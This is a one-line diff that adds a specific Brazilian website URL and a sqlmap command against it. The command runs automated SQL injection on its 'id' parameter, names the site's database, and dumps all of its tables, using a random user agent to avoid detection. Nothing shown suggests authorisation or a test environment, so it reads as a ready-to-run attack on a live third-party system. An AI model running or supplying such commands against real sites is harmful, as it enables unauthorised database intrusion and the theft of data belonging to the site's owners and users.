@@ -1,0 +1,1 @@
+http://www.expalum.com.br/videos.php?id=1 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.expalum.com.br/videos.php?id=1 -D expalum --tables --dump-all
